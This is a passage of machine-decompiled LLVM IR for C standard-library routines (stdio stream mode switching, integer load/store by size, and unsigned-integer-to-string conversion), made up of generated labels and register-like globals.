  %v2_8055259 = sub i32 %v0_8055259, %v1_8055259
  store i32 %v2_8055259, i32* @edi, align 4
  br label %dec_label_pc_805528e

dec_label_pc_805525d:                             ; preds = %dec_label_pc_80551ef
  %v2_805525d = add i32 %arg3, 8
  %v3_805525d = inttoptr i32 %v2_805525d to i32*
  %v4_805525d = load i32, i32* %v3_805525d, align 4
  %v15_805525d = icmp eq i32 %v3_80551c9, %v4_805525d
  br i1 %v15_805525d, label %dec_label_pc_8055276, label %dec_label_pc_8055262

dec_label_pc_8055262:                             ; preds = %dec_label_pc_805525d
  %v1_8055266 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8055266, i32* %eax.global-to-local, align 4
  %v1_805526e = icmp eq i32 %v1_8055266, 0
  br i1 %v1_805526e, label %dec_label_pc_8055262.dec_label_pc_8055276_crit_edge, label %dec_label_pc_8055272

dec_label_pc_8055262.dec_label_pc_8055276_crit_edge: ; preds = %dec_label_pc_8055262
  %v0_8055276.pre = load i32, i32* @edi, align 4
  %v0_805527e.pre = load i32, i32* @ebx, align 4
  %v2_8055285.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055276

dec_label_pc_8055272:                             ; preds = %dec_label_pc_8055262
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805528e

dec_label_pc_8055276:                             ; preds = %dec_label_pc_8055262.dec_label_pc_8055276_crit_edge, %dec_label_pc_805525d, %entry
  %v2_8055285 = phi i32 [ %v2_8055285.pre, %dec_label_pc_8055262.dec_label_pc_8055276_crit_edge ], [ %v0_80551ab, %dec_label_pc_805525d ], [ %v0_80551ab, %entry ]
  %v0_805527e = phi i32 [ %v0_805527e.pre, %dec_label_pc_8055262.dec_label_pc_8055276_crit_edge ], [ %arg3, %dec_label_pc_805525d ], [ %arg3, %entry ]
  %v0_8055276 = phi i32 [ %v0_8055276.pre, %dec_label_pc_8055262.dec_label_pc_8055276_crit_edge ], [ %arg2, %dec_label_pc_805525d ], [ %arg2, %entry ]
  store i32 %v2_8055285, i32* @ebx, align 4
  store i32 %v0_80551a9, i32* @edi, align 4
  %v4_8055289 = inttoptr i32 %v0_805527e to i16*
  %v5_8055289 = call i32 @__stdio_WRITE(i16* %v4_8055289, i32 %v0_8055276, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055289, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805528e

dec_label_pc_805528e:                             ; preds = %dec_label_pc_8055237, %dec_label_pc_805521f, %dec_label_pc_805520e, %dec_label_pc_80551f5, %dec_label_pc_8055272, %dec_label_pc_8055250, %dec_label_pc_80551db, %dec_label_pc_8055276
  %v0_8055291 = load i32, i32* @edi, align 4
  store i32 %v0_8055291, i32* %eax.global-to-local, align 4
  %v2_8055293 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055293, i32* @ebx, align 4
  store i32 %v0_80551aa, i32* @esi, align 4
  store i32 %v0_80551a9, i32* @edi, align 4
  store i32 %v0_80551a8, i32* @ebp, align 4
  ret i32 %v0_8055291

; uselistorder directives
  uselistorder i32 %v2_8055254, { 1, 0 }
  uselistorder i32 %v4_8055242, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055239, { 1, 0, 2 }
  uselistorder i32 %v0_805522f, { 3, 0, 1, 2 }
  uselistorder i32 %v2_80551ef, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_80551a9, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_805528e, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8055237, { 1, 0 }
  uselistorder label %dec_label_pc_80551db, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055298 = load i32, i32* @ebx, align 4
  %v4_805529c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805529c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_80552a4 = bitcast i16* %arg1 to i32*
  %v2_80552a4 = load i32, i32* %v1_80552a4, align 4
  store i32 %v2_80552a4, i32* %eax.global-to-local, align 4
  %v1_80552a6 = urem i32 %v2_80552a4, 65536
  store i32 %v1_80552a6, i32* %edx.global-to-local, align 4
  %v2_80552a9 = and i32 %v1_80552a6, %arg2
  %v3_80552a9 = icmp eq i32 %v2_80552a9, 0
  %v1_80552ab = icmp eq i1 %v3_80552a9, false
  br i1 %v1_80552ab, label %dec_label_pc_80552ba, label %dec_label_pc_80552ad

dec_label_pc_80552ad:                             ; preds = %entry
  %v1_80552ad = and i32 %v2_80552a4, 2176
  %v2_80552ad = icmp eq i32 %v1_80552ad, 0
  store i32 %v1_80552ad, i32* %edx.global-to-local, align 4
  %v1_80552b3 = icmp eq i1 %v2_80552ad, false
  br i1 %v1_80552b3, label %dec_label_pc_80552c2, label %dec_label_pc_80552b5

dec_label_pc_80552b5:                             ; preds = %dec_label_pc_80552ad
  %v2_80552b5 = or i32 %v2_80552a4, %arg2
  store i32 %v2_80552b5, i32* %eax.global-to-local, align 4
  %v1_80552b7 = trunc i32 %v2_80552b5 to i16
  store i16 %v1_80552b7, i16* %arg1, align 2
  %v0_80552ba.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80552ba

dec_label_pc_80552ba:                             ; preds = %entry, %dec_label_pc_80552b5
  %v0_80552ff = phi i32 [ %v4_805529c, %entry ], [ %v0_80552ba.pre, %dec_label_pc_80552b5 ]
  %v1_80552ba = inttoptr i32 %v0_80552ff to i16*
  %v2_80552ba = load i16, i16* %v1_80552ba, align 2
  %v3_80552ba = zext i16 %v2_80552ba to i32
  store i32 %v3_80552ba, i32* %edx.global-to-local, align 4
  %v2_80552bd = and i16 %v2_80552ba, 32
  %v3_80552bd = icmp eq i16 %v2_80552bd, 0
  br i1 %v3_80552bd, label %dec_label_pc_80552d6, label %dec_label_pc_80552c2

dec_label_pc_80552c2:                             ; preds = %dec_label_pc_80552ba, %dec_label_pc_80552ad
  %v1_80552c2 = call i32 @__errno_location(i32 %v0_8055298)
  store i32 %v1_80552c2, i32* %eax.global-to-local, align 4
  %v1_80552c7 = inttoptr i32 %v1_80552c2 to i32*
  store i32 9, i32* %v1_80552c7, align 4
  br label %dec_label_pc_80552cd

dec_label_pc_80552cd:                             ; preds = %dec_label_pc_80552ed, %dec_label_pc_80552c2
  %v0_80552cd = load i32, i32* @ebx, align 4
  %v1_80552cd = inttoptr i32 %v0_80552cd to i16*
  %v2_80552cd = load i16, i16* %v1_80552cd, align 2
  %v3_80552cd = or i16 %v2_80552cd, 8
  store i16 %v3_80552cd, i16* %v1_80552cd, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055330

dec_label_pc_80552d6:                             ; preds = %dec_label_pc_80552ba
  %v2_80552d6 = urem i16 %v2_80552ba, 4
  %v3_80552d6 = icmp eq i16 %v2_80552d6, 0
  br i1 %v3_80552d6, label %dec_label_pc_805531c, label %dec_label_pc_80552db

dec_label_pc_80552db:                             ; preds = %dec_label_pc_80552d6
  %v2_80552db = and i32 %v3_80552ba, 4
  %v3_80552db = icmp eq i32 %v2_80552db, 0
  %v1_80552de = icmp eq i1 %v3_80552db, false
  br i1 %v1_80552de, label %dec_label_pc_805530c, label %dec_label_pc_80552e0

dec_label_pc_80552e0:                             ; preds = %dec_label_pc_80552db
  %v1_80552e0 = add i32 %v0_80552ff, 20
  %v2_80552e0 = inttoptr i32 %v1_80552e0 to i32*
  %v3_80552e0 = load i32, i32* %v2_80552e0, align 4
  store i32 %v3_80552e0, i32* %eax.global-to-local, align 4
  %v2_80552e3 = add i32 %v0_80552ff, 16
  %v3_80552e3 = inttoptr i32 %v2_80552e3 to i32*
  %v4_80552e3 = load i32, i32* %v3_80552e3, align 4
  %v15_80552e3 = icmp eq i32 %v3_80552e0, %v4_80552e3
  %v1_80552e6 = icmp eq i1 %v15_80552e3, false
  br i1 %v1_80552e6, label %dec_label_pc_80552ed, label %dec_label_pc_80552e8

dec_label_pc_80552e8:                             ; preds = %dec_label_pc_80552e0
  %v2_80552e8 = and i32 %v3_80552ba, 2
  %v3_80552e8 = icmp eq i32 %v2_80552e8, 0
  br i1 %v3_80552e8, label %dec_label_pc_805530c, label %dec_label_pc_80552ed

dec_label_pc_80552ed:                             ; preds = %dec_label_pc_80552e8, %dec_label_pc_80552e0
  %v1_80552ed = and i32 %v3_80552ba, 1024
  store i32 %v1_80552ed, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_80552ed, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_8055300 = call i32 @__GI_fseek(i32 %v0_80552ff, i32 0, i32 %tmp18, i32 %v1_80552ed)
  store i32 %v5_8055300, i32* %eax.global-to-local, align 4
  %v1_8055308 = icmp eq i32 %v5_8055300, 0
  %v1_805530a = icmp eq i1 %v1_8055308, false
  br i1 %v1_805530a, label %dec_label_pc_80552cd, label %dec_label_pc_80552ed.dec_label_pc_805530c_crit_edge

dec_label_pc_80552ed.dec_label_pc_805530c_crit_edge: ; preds = %dec_label_pc_80552ed
  %v0_805530c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805530c

dec_label_pc_805530c:                             ; preds = %dec_label_pc_80552ed.dec_label_pc_805530c_crit_edge, %dec_label_pc_80552e8, %dec_label_pc_80552db
  %v10_805530c = phi i32 [ %v0_805530c.pre, %dec_label_pc_80552ed.dec_label_pc_805530c_crit_edge ], [ %v0_80552ff, %dec_label_pc_80552e8 ], [ %v0_80552ff, %dec_label_pc_80552db ]
  %v1_805530c = inttoptr i32 %v10_805530c to i16*
  %v2_805530c = load i16, i16* %v1_805530c, align 2
  %v3_805530c = and i16 %v2_805530c, -4
  store i16 %v3_805530c, i16* %v1_805530c, align 2
  %v0_8055310 = load i32, i32* @ebx, align 4
  %v1_8055310 = add i32 %v0_8055310, 8
  %v2_8055310 = inttoptr i32 %v1_8055310 to i32*
  %v3_8055310 = load i32, i32* %v2_8055310, align 4
  store i32 %v3_8055310, i32* %eax.global-to-local, align 4
  %v2_8055313 = add i32 %v0_8055310, 24
  %v3_8055313 = inttoptr i32 %v2_8055313 to i32*
  store i32 %v3_8055310, i32* %v3_8055313, align 4
  %v0_8055316 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055316 = load i32, i32* @ebx, align 4
  %v2_8055316 = add i32 %v1_8055316, 16
  %v3_8055316 = inttoptr i32 %v2_8055316 to i32*
  store i32 %v0_8055316, i32* %v3_8055316, align 4
  %v0_8055319 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055319 = load i32, i32* @ebx, align 4
  %v2_8055319 = add i32 %v1_8055319, 20
  %v3_8055319 = inttoptr i32 %v2_8055319 to i32*
  store i32 %v0_8055319, i32* %v3_8055319, align 4
  %v0_805531c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805531c

dec_label_pc_805531c:                             ; preds = %dec_label_pc_80552d6, %dec_label_pc_805530c
  %v9_805531c = phi i32 [ %v0_80552ff, %dec_label_pc_80552d6 ], [ %v0_805531c.pre, %dec_label_pc_805530c ]
  %v1_805531c = inttoptr i32 %v9_805531c to i16*
  %v2_805531c = load i16, i16* %v1_805531c, align 2
  %v3_805531c = or i16 %v2_805531c, 64
  store i16 %v3_805531c, i16* %v1_805531c, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8055322 = load i32, i32* @ebx, align 4
  %v1_8055322 = inttoptr i32 %v0_8055322 to i16*
  %v2_8055322 = load i16, i16* %v1_8055322, align 2
  %v3_8055322 = zext i16 %v2_8055322 to i32
  store i32 %v3_8055322, i32* %eax.global-to-local, align 4
  %v3_8055325 = and i16 %v2_8055322, 2816
  %v4_8055325 = icmp eq i16 %v3_8055325, 0
  %v1_8055328 = icmp eq i1 %v4_8055325, false
  br i1 %v1_8055328, label %dec_label_pc_8055330, label %dec_label_pc_805532a

dec_label_pc_805532a:                             ; preds = %dec_label_pc_805531c
  %v1_805532a = add i32 %v0_8055322, 12
  %v2_805532a = inttoptr i32 %v1_805532a to i32*
  %v3_805532a = load i32, i32* %v2_805532a, align 4
  store i32 %v3_805532a, i32* %eax.global-to-local, align 4
  %v2_805532d = add i32 %v0_8055322, 28
  %v3_805532d = inttoptr i32 %v2_805532d to i32*
  store i32 %v3_805532a, i32* %v3_805532d, align 4
  %v0_8055330.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055330

dec_label_pc_8055330:                             ; preds = %dec_label_pc_805531c, %dec_label_pc_80552cd, %dec_label_pc_805532a
  %v0_8055330 = phi i32 [ 0, %dec_label_pc_805531c ], [ -1, %dec_label_pc_80552cd ], [ %v0_8055330.pre, %dec_label_pc_805532a ]
  store i32 %v0_8055330, i32* %eax.global-to-local, align 4
  %v2_8055332 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055332, i32* @edx, align 4
  store i32 %v0_8055298, i32* @ebx, align 4
  ret i32 %v0_8055330

; uselistorder directives
  uselistorder i32 %v0_8055330, { 1, 0 }
  uselistorder i32 %v0_8055322, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_80552ed, { 1, 0, 2 }
  uselistorder i32 %v0_80552ff, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_80552a6, { 1, 0 }
  uselistorder i32 %v2_80552a4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8055298, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055330, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805531c, { 1, 0 }
  uselistorder label %dec_label_pc_80552ba, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8055340 = icmp slt i32 %tmp, 0
  %v3_8055369 = and i32 %tmp5, 2048
  %v4_8055369 = icmp eq i32 %v3_8055369, 0
  br i1 %v5_8055340, label %dec_label_pc_8055369, label %dec_label_pc_8055347

dec_label_pc_8055347:                             ; preds = %entry
  %v1_805534a = icmp eq i1 %v4_8055369, false
  br i1 %v1_805534a, label %dec_label_pc_805536e, label %dec_label_pc_805534c

dec_label_pc_805534c:                             ; preds = %dec_label_pc_8055347
  %v1_805534c = inttoptr i32 %tmp4 to i32*
  %v2_805534c = load i32, i32* %v1_805534c, align 4
  %v6_805534e = icmp eq i32 %tmp5, 256
  %v1_8055354 = icmp eq i1 %v6_805534e, false
  br i1 %v1_8055354, label %dec_label_pc_805535b, label %dec_label_pc_8055356

dec_label_pc_8055356:                             ; preds = %dec_label_pc_805534c
  %v1_8055356 = urem i32 %v2_805534c, 256
  br label %dec_label_pc_8055366

dec_label_pc_805535b:                             ; preds = %dec_label_pc_805534c
  %v6_805535b = icmp eq i32 %tmp5, 512
  %v1_8055361 = icmp eq i1 %v6_805535b, false
  br i1 %v1_8055361, label %dec_label_pc_8055366, label %dec_label_pc_8055363

dec_label_pc_8055363:                             ; preds = %dec_label_pc_805535b
  %v1_8055363 = urem i32 %v2_805534c, 65536
  br label %dec_label_pc_8055366

dec_label_pc_8055366:                             ; preds = %dec_label_pc_805535b, %dec_label_pc_8055356, %dec_label_pc_8055363
  %v0_8055368 = phi i32 [ %v2_805534c, %dec_label_pc_805535b ], [ %v1_8055356, %dec_label_pc_8055356 ], [ %v1_8055363, %dec_label_pc_8055363 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8055368

dec_label_pc_8055369:                             ; preds = %entry
  br i1 %v4_8055369, label %dec_label_pc_8055374, label %dec_label_pc_805536e

dec_label_pc_805536e:                             ; preds = %dec_label_pc_8055369, %dec_label_pc_8055347
  %v1_805536e = add i32 %tmp4, 4
  %v2_805536e = inttoptr i32 %v1_805536e to i32*
  %v3_805536e = load i32, i32* %v2_805536e, align 4
  store i32 %v3_805536e, i32* @edx, align 4
  %v1_8055371 = inttoptr i32 %tmp4 to i32*
  %v2_8055371 = load i32, i32* %v1_8055371, align 4
  ret i32 %v2_8055371

dec_label_pc_8055374:                             ; preds = %dec_label_pc_8055369
  %v1_8055374 = inttoptr i32 %tmp4 to i32*
  %v2_8055374 = load i32, i32* %v1_8055374, align 4
  %v6_8055376 = icmp eq i32 %tmp5, 256
  %v1_805537c = icmp eq i1 %v6_8055376, false
  br i1 %v1_805537c, label %dec_label_pc_8055383, label %dec_label_pc_805537e

dec_label_pc_805537e:                             ; preds = %dec_label_pc_8055374
  %v1_805537e = mul i32 %v2_8055374, 16777216
  %v2_805537e = sdiv i32 %v1_805537e, 16777216
  br label %dec_label_pc_805538c

dec_label_pc_8055383:                             ; preds = %dec_label_pc_8055374
  %v6_8055383 = icmp eq i32 %tmp5, 512
  %v1_8055389 = icmp eq i1 %v6_8055383, false
  br i1 %v1_8055389, label %dec_label_pc_805538c, label %dec_label_pc_805538b

dec_label_pc_805538b:                             ; preds = %dec_label_pc_8055383
  %v1_805538b = mul i32 %v2_8055374, 65536
  %v2_805538b = sdiv i32 %v1_805538b, 65536
  br label %dec_label_pc_805538c

dec_label_pc_805538c:                             ; preds = %dec_label_pc_8055383, %dec_label_pc_805537e, %dec_label_pc_805538b
  %v0_805538c = phi i32 [ %v2_8055374, %dec_label_pc_8055383 ], [ %v2_805537e, %dec_label_pc_805537e ], [ %v2_805538b, %dec_label_pc_805538b ]
  %v1_805538c = ashr i32 %v0_805538c, 31
  store i32 %v1_805538c, i32* @edx, align 4
  ret i32 %v0_805538c

; uselistorder directives
  uselistorder i32 %v0_805538c, { 1, 0 }
  uselistorder i32 %v2_8055374, { 2, 0, 1 }
  uselistorder i32 %v2_805534c, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805538c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055366, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055390 = load i32, i32* @ebx, align 4
  store i32 %v0_8055390, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8055395 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8055395, i32* %ebx.global-to-local, align 4
  %v4_8055399 = trunc i32 %tmp4 to i16
  %v6_80553a1 = icmp eq i32 %tmp6, 256
  %v1_80553a7 = icmp eq i1 %v6_80553a1, false
  br i1 %v1_80553a7, label %dec_label_pc_80553ad, label %dec_label_pc_80553a9

dec_label_pc_80553a9:                             ; preds = %entry
  %v2_80553a9 = trunc i32 %tmp4 to i8
  %v4_80553a9 = bitcast i16* %tmp5 to i8*
  store i8 %v2_80553a9, i8* %v4_80553a9, align 1
  br label %dec_label_pc_80553cb

dec_label_pc_80553ad:                             ; preds = %entry
  %v6_80553ad = icmp eq i32 %tmp6, 2048
  %v1_80553b3 = icmp eq i1 %v6_80553ad, false
  br i1 %v1_80553b3, label %dec_label_pc_80553bc, label %dec_label_pc_80553b5

dec_label_pc_80553b5:                             ; preds = %dec_label_pc_80553ad
  %sext2 = mul i32 %tmp4, 65536
  %v1_80553b5 = sdiv i32 %sext2, 65536
  %v3_80553b5 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80553b5, i32* %v3_80553b5, align 4
  %v0_80553b7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80553b7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80553b7 = add i32 %v1_80553b7, 4
  %v3_80553b7 = inttoptr i32 %v2_80553b7 to i32*
  store i32 %v0_80553b7, i32* %v3_80553b7, align 4
  br label %dec_label_pc_80553cb

dec_label_pc_80553bc:                             ; preds = %dec_label_pc_80553ad
  %v6_80553bc = icmp eq i32 %tmp6, 512
  %v1_80553c2 = icmp eq i1 %v6_80553bc, false
  br i1 %v1_80553c2, label %dec_label_pc_80553c9, label %dec_label_pc_80553c4

dec_label_pc_80553c4:                             ; preds = %dec_label_pc_80553bc
  store i16 %v4_8055399, i16* %tmp5, align 2
  br label %dec_label_pc_80553cb

dec_label_pc_80553c9:                             ; preds = %dec_label_pc_80553bc
  %sext3 = mul i32 %tmp4, 65536
  %v1_80553c9 = sdiv i32 %sext3, 65536
  %v3_80553c9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80553c9, i32* %v3_80553c9, align 4
  br label %dec_label_pc_80553cb

dec_label_pc_80553cb:                             ; preds = %dec_label_pc_80553c4, %dec_label_pc_80553b5, %dec_label_pc_80553a9, %dec_label_pc_80553c9
  %v2_80553cb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80553cb, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80553cc = sdiv i32 %sext, 65536
  ret i32 %v1_80553cc

; uselistorder directives
  uselistorder label %dec_label_pc_80553cb, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80553db = ptrtoint i8* %arg1 to i32
  store i32 %v4_80553db, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80553e7 = icmp slt i32 %arg4, 0
  %v1_80553e9 = icmp eq i1 %v2_80553e7, false
  br i1 %v1_80553e9, label %dec_label_pc_805540a, label %dec_label_pc_80553eb

dec_label_pc_80553eb:                             ; preds = %entry
  %v1_80553eb = sub i32 0, %arg4
  store i32 %v1_80553eb, i32* %esi.global-to-local, align 4
  %v2_80553ed = icmp slt i32 %arg3, 0
  %v1_80553ef = icmp eq i1 %v2_80553ed, false
  br i1 %v1_80553ef, label %dec_label_pc_805540a, label %dec_label_pc_80553f1

dec_label_pc_80553f1:                             ; preds = %dec_label_pc_80553eb
  %v1_80553f1 = sub i32 0, %arg2
  %v5_80553f1 = icmp ne i32 %arg2, 0
  store i32 %v1_80553f1, i32* %ecx.global-to-local, align 4
  %v2_80553f3 = zext i1 %v5_80553f1 to i32
  %v3_80553f3 = add i32 %v2_80553f3, %arg3
  %v1_80553fe = sub i32 0, %v3_80553f3
  store i32 %v1_80553fe, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805540a

dec_label_pc_805540a:                             ; preds = %entry, %dec_label_pc_80553eb, %dec_label_pc_80553f1
  %v0_805540f = phi i32 [ %v1_80553eb, %dec_label_pc_80553f1 ], [ %v1_80553eb, %dec_label_pc_80553eb ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_80553f1 ], [ 0, %dec_label_pc_80553eb ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_805540f
  %tmp35 = urem i32 -1, %v0_805540f
  %v1_8055411 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8055415 = load i32, i32* %esi.global-to-local, align 4
  %v12_8055415 = icmp eq i32 %v1_8055411, %v1_8055415
  %v1_805541f = icmp eq i1 %v12_8055415, false
  br i1 %v1_805541f, label %dec_label_pc_805542e, label %dec_label_pc_8055421

dec_label_pc_8055421:                             ; preds = %dec_label_pc_805540a
  %v1_8055421 = add i32 %div, 1
  br label %dec_label_pc_805542e

dec_label_pc_805542e:                             ; preds = %dec_label_pc_805540a, %dec_label_pc_8055421
  %stack_var_-20.0.off0 = phi i32 [ %v1_8055411, %dec_label_pc_805540a ], [ 0, %dec_label_pc_8055421 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_805540a ], [ %v1_8055421, %dec_label_pc_8055421 ]
  %v0_805542e = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_805542e, i32* %ebp.global-to-local, align 4
  %v0_8055430 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055430, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055436

dec_label_pc_8055436:                             ; preds = %dec_label_pc_8055475, %dec_label_pc_805542e
  %v0_805546d = phi i32 [ %v0_8055486, %dec_label_pc_8055475 ], [ %v0_805542e, %dec_label_pc_805542e ]
  %v0_805543a = phi i32 [ %v1_8055488, %dec_label_pc_8055475 ], [ %v0_8055430, %dec_label_pc_805542e ]
  %v1_8055436 = icmp eq i32 %v0_805543a, 0
  br i1 %v1_8055436, label %dec_label_pc_805546d, label %dec_label_pc_805543a

dec_label_pc_805543a:                             ; preds = %dec_label_pc_8055436
  %v0_805543e = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_805543a, %v0_805543e
  %tmp36 = urem i32 %v0_805543a, %v0_805543e
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_805546d, %v0_805543e
  %tmp37 = urem i32 %v0_805546d, %v0_805543e
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8055451 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8055455 = add i32 %tmp37, %v6_8055451
  %v8_805545b = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8055460 = add i32 %div8, %v8_805545b
  store i32 %v2_8055460, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8055455, %v0_805543e
  %tmp38 = urem i32 %v2_8055455, %v0_805543e
  %v2_8055468 = add i32 %div9, %v2_8055460
  br label %dec_label_pc_8055475

dec_label_pc_805546d:                             ; preds = %dec_label_pc_8055436
  %v0_8055471 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_805546d, %v0_8055471
  %tmp39 = urem i32 %v0_805546d, %v0_8055471
  br label %dec_label_pc_8055475

dec_label_pc_8055475:                             ; preds = %dec_label_pc_805543a, %dec_label_pc_805546d
  %v0_805547b = phi i32 [ %tmp38, %dec_label_pc_805543a ], [ %tmp39, %dec_label_pc_805546d ]
  %storemerge = phi i32 [ %v2_8055468, %dec_label_pc_805543a ], [ %div12, %dec_label_pc_805546d ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8055475 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055475 = add i32 %v0_8055475, -1
  store i32 %v1_8055475, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_805547b, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_805547b
  %v8_805547b = trunc i32 %storemerge14.in to i8
  %v3_8055484 = inttoptr i32 %v1_8055475 to i8*
  store i8 %v8_805547b, i8* %v3_8055484, align 1
  %v0_8055486 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055488 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055488 = or i32 %v1_8055488, %v0_8055486
  %v3_8055488 = icmp eq i32 %v2_8055488, 0
  %v1_805548a = icmp eq i1 %v3_8055488, false
  br i1 %v1_805548a, label %dec_label_pc_8055436, label %dec_label_pc_805548c

dec_label_pc_805548c:                             ; preds = %dec_label_pc_8055475
  %v4_805548c = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_805548c, label %dec_label_pc_8055497, label %dec_label_pc_8055493

dec_label_pc_8055493:                             ; preds = %dec_label_pc_805548c
  %v0_8055493 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055493 = add i32 %v0_8055493, -1
  store i32 %v1_8055493, i32* %edi.global-to-local, align 4
  %v1_8055494 = inttoptr i32 %v1_8055493 to i8*
  store i8 45, i8* %v1_8055494, align 1
  br label %dec_label_pc_8055497

dec_label_pc_8055497:                             ; preds = %dec_label_pc_805548c, %dec_label_pc_8055493
  %v0_805549a = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_805549a

; uselistorder directives
  uselistorder i32 %v2_8055455, { 1, 0 }
  uselistorder i32 %v0_805543e, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_805543a, { 1, 0, 2 }
  uselistorder i32 %v0_805546d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805540f, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055497, { 1, 0 }
  uselistorder label %dec_label_pc_8055475, { 1, 0 }
  uselistorder label %dec_label_pc_805542e, { 1, 0 }
